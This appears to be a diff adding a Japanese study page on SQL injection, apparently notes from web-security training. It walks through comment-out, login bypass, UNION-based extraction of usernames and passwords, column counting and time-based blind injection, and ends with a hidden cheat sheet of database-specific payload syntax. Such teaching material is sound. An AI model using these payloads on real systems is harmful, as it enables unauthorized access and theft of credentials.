@@ -1,0 +1,237 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>SQLインジェクション</title>
+  </head>
+  <body>
+    
+    <h1>SQLインジェクション</h1>
+    <div class=retrieve>
+      <p>
+        SQLインジェクションは、アプリケーションがデータベースに対して行うクエリの不正利用を可能とする脆弱性である。
+        この脆弱性により、攻撃者は他のユーザーのデータを取得したり、アプリケーションデータの閲覧を可能とする。
+      </p>
+      
+      <h2>発生しうる脅威</h2>
+      <ul>
+        <li>非公開情報の閲覧</li>
+        <li>情報の改竄、消去</li>
+        <li>認証回避による不正ログイン</li>
+      </ul>
+
+      <h2>
+        SQLインジェクション手法
+      </h2>
+      <ul>
+        <li>コメントアウト</li>
+        <li><code>UNION</code></li>
+        <li>ブラインドSQLインジェクション</li>
+      </ul>
+
+      <h2>コメントアウト</h2>
+      <p>
+        ショッピングサイトで商品をカテゴリ別に絞り込む機能を例に考えてみよう。
+        商品のカテゴリを本にのみ絞り込む際に次のようなURLがリクエストされる。
+      </p>
+      <p><code>https://insecure-website.com/produts?category=books</code></p>
+      <p>
+        リクエストが送信されると次のようなSQL文が発行される。
+      </p>
+      <p><code>SELECT * FROM products WHERE category = 'books' and released = 1</code></p>
+      <p>
+        このSQL文は
+        <ul>
+          <li><code>products</code>のテーブルから (<code>FROM products</code>)</li>
+          <li>カテゴリが<code>books</code>であり (<code>WHERE category = 'books'</code>)</li>
+          <li>なおかつ発売中に該当する (<code>AND released = 1</code>)</li>
+          <li>データの概要全て (<code>SELECT *</code>)</li>
+        </ul>
+        が返される。
+      </p>
+      <p>
+        この例では<code>released = 1</code>によって未発売の商品は表示されないようになっている。
+        しかし、入力値に対して何ら確認もしていない場合、次のようなURLでリクエストを攻撃者がし得る。
+      </p>
+      <p><code>https://insecure-website.com/products?category=books'--</code></p>
+      <p>
+        この場合、次のようなSQL文が発行される。
+      </p>
+      <p><code>SELECT * FROM products WHERE category = 'books'--' AND released = 1</code></p>
+      <p>
+        SQLにおいてハイフン二つ<code>--</code>を記述すると<code>--</code>から行末までのの文字列はコメントになる。
+        コメントすることにより--以降は無効化されるため、<code>and released = 1</code>　が無効化され、未発売商品のデータも返される。
+      </p>
+      <p>
+        さらに次のようなリクエストで全てのカテゴリの未発売商品のデータを表示できる。
+      </p>
+      <p><code>https://insecure-website.com/products?category=books'+or+1=1--</code></p>
+      <p>この場合、次のようなSQL文が発行される。</p>
+      <p><code>SELECT * FROM products WHERE category = 'books' OR 1=1--'</code></p>
+      <p>
+        上記クエリはカテゴリが<code>books</code>もしくは<code>1=1</code>に該当するデータを返す。
+        <code>1=1</code>は常に真なので、全てのデータが返される。
+      </p>
+    </div>
+    <div class=subvert>
+      <p>
+        同様にユーザー名とパスワードでログインするアプリの認証も回避できる。
+        ユーザー名wienerとパスワードbluecheeseでログインした場合、次のようなSQL文が実行される。
+      </p>
+      <p><code>SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'</code></p>
+      <p>
+        上記クエリによりユーザー情報が返された場合はログインに成功し、返されなかった場合はログインに失敗する。
+        ここでも、攻撃者は<code>--</code>を使用することでパスワード認証を回避できる。
+      </p>
+      <p>
+        例としてユーザー名に<code>administrator'--</code>を入力しパスワードを空白にした場合、次のようなクエリが発行される。
+      </p>
+      <p><code>SELECT * FROM users WHERE username = 'administrator'--' AND password = ''</code></p>
+      <p>
+        上記クエリはパスワードの確認を無効をせずにadministratorの情報を返し、administratorとして攻撃者はログイン出来ることになる。
+      </p>
+    </div>
+    <div class=union>
+      <h2>統合</h2>
+      <p>
+        アプリケーションにSQLインジェクションの脆弱性があり、なおかつクエリの結果がアプリケーションに表示される場合、
+        <code>UNION</code>を使用することによりデータベースの他のテーブルのデータを表示できる。
+      </p>
+      <p>
+        <code>UNION</code>はクエリに別のクエリを統合して1つの結果として返す役割をもつ。例として次のようなカテゴリをギフトに絞り込むクエリがある。
+      </p>
+      <p><code>SELECT name, description FROM products WHERE category = 'gifts'</code></p>
+      <p>
+        この場合、攻撃者は以下のような入力値を送信できる。
+      </p>
+      <p><code>'UNION SELECT username, password FROM users--</code></p>
+      <p>
+        上記クエリが実行されるとusernameとpasswordが元々の結果に統合されて返される。
+      </p>
+      <p>
+        <code>UNION</code>を実行するには2つの条件がある。
+        <ul>
+          <li>それぞれのクエリで返される列の数が同じである。</li>
+          <li>それぞれの結合される列のデータタイプが同じである。</li>
+        </ul>
+        SQLインジェクションにおいて、効率よく列数を確認する方法が2つある。
+        1つめは<code>ORDER BY</code>を使用し、エラーが発生するまで列数を増やす方法。
+        例えば、次のような値を脆弱性のあるアプリケーションに入力する。
+      </p>
+      <p>
+        <code>'ORDER BY 1--</code>
+        <br><code>'ORDER BY 2--</code>
+        <br><code>'ORDER BY 3--</code>
+        <br><code>etc.</code>
+      </p>
+      <p>
+        上記のクエリは指定した列を基準に昇順に並び替える。
+        列番号で指定できるため、列名を知る必要もない。
+        列数以上の列番号を指定した場合はエラーが返される。
+      </p>
+      <p>
+        列数を特定する2つめの方法はいくつかの<code>NULL</code>値でクエリを実行する
+      </p>
+      <p>
+        <code>'UNION SELECT NULL--</code>
+        <br><code>'UNION SELECT NULL, NULL--</code>
+        <br><code>'UNION SELECT NULL, NULL, NULL--</code>
+        <br><code>etc.</code>
+      </p>
+      <p>
+        <code>NULL</code>の列数が元々のクエリの列数が異なるとエラーが発生する。
+        <code>ORDER BY</code>と<code>UNION</code>のどちらもエラーが発生しない最大数が列数と判断できる。
+      </p>
+      <p>
+        ただし、<code>ORDER BY</code>や<code>UNION</code>はエラーなどの挙動で列数を特定するため、
+        エラーと通常のレスポンスが区別できない場合は上記の方法は無意味になる。
+      </p>
+    </div>
+    <div class=blind>
+      <h2>ブラインドSQLインジェクション</h2>
+      <p>
+        ブラインドSQLインジェクションはアプリケーションがSQLインジェクションの脆弱性があるものの、
+        HTTPレスポンスではクエリの結果やエラー表示されない場合の脆弱性のことを言う。
+      </p>
+      <p>
+        ブラインドSQLインジェクションを悪用するには条件分岐を活用する必要がある。
+        解析用データを収集するために<code>trackingid</code>というクッキーを使用してるアプリケーションを例に考えてみようｌ
+        クッキーが処理される際、以下のようなクエリが実行される。
+      </p>
+      <p><code>SELECT trackingid FROM trackedusers WHERE trackingid = 'qwerty123'</code></p>
+      <p>
+        <code>trackingid</code>が正しいとページは自分のユーザー名を表示し、正しくないとユーザー名が表示されない。
+        このクエリにブラインドSQLインジェクションの脆弱性があると、以下のような入力を送信することでデータベース内の情報を参照できる。
+      </p>
+      <p><code>qwerty123' AND (SELECT CASE WHEN username='administrator' and SUBSTRING(password,1,1) = 'a' THEN SLEEP(10) ELSE 1 END FROM users) = 1</code></p>
+      <p>
+        上記クエリはユーザー名が<code>administrator</code>のパスワードの一文字目がaか確認し、aだった場合はレスポンスを10秒遅延し、<code>a</code>でなければレスポンスは遅延されない。
+        これをアルファベットの大文字、小文字と数字で繰り返すことにより、<code>administrator</code>のパスワード特定できる。
+      </p>
+    </div>
+  </body>
+</html>
+<!-- SQLインジェクション
+SQLインジェクション早見表
+    文字連結
+    Oracle        'foo' || 'bar'
+    Microsoft     'foo' + 'bar'
+    PostgreSQL    'foo' || 'bar'
+    MySQL         'foo' 'bar'
+                  concat('foo','bar')
+
+    文字列の切り取り
+    Oracle        substr('foobar', 4, 2)
+    Microsoft     substring('foobar', 4, 2)
+    PostgreSQL    substring('foobar', 4, 2)
+    MySQL         substring('foobar', 4, 2)
+
+    コメント
+    Oracle        --comment
+    Microsoft     --comment
+                  /*comment*/
+    PostgreSQL    --comment
+                  /*comment*/
+    MySQL         #comment
+                  -- comment
+                  /*comment*/
+
+    データベースバージョン
+    Oracle        select banner from v$version
+                  select version from v$instance
+    Microsoft     select @@version
+    PostgreSQL    select version()
+    MySQL         select @@version
+
+    データベース情報
+    Oracle        select * from all_tables
+                  select * from all_tab_columns where table_name = 'some-table-name'
+    Microsoft     select * from information_schema.tables
+                  select * from information_schema.columns where table_name = 'some-table-name'
+    PostgreSQL    select * from information_schema.tables
+                  select * from information_schema.columns where table_name = 'some-table-name'
+    MySQL         select * from information_schema.tables
+                  select * from information_schema.columns where table_name = 'some-table_name'
+
+    条件分岐
+    Oracle        select case when (some-condition) then to_char(1/0) else null end from dual
+    Microsoft     select case when (some-condition) then 1/0 else null end
+    PostgreSQL    select case when (some-condition) then cast(1/0 as text) else null end
+    MySQL         select if(some-condition, (select table_name from information_schema.tables),'a')
+
+    複数のクエリ
+    Oracle        不可
+    Microsoft     some-query-1; some-query-2
+    PostgreSQL    some-query-1; some-query-2
+    MySQL         some-query-1; some-query-2
+
+    遅延
+    Oracle        dbms_pipe.recieve_message(('a'),10)
+    Microsoft     waitfor delay '0:0:10'
+    PostgreSQL    select pg_sleep(10)
+    MySQL         select sleep(10)
+
+    条件遅延
+    Oracle        select case when (some-condition) then 'a' || dbms_pipe.receive_message(('a'),10) else null end from dual
+    Microsoft     if (some-condition) waitfor delay '0:0:10'
+    PostgreSQL    select case when (some-condition) then pg_sleep(10) else pg_sleep(0) end
+    MySQL         select if(some-condition,sleep(10),'a') -->
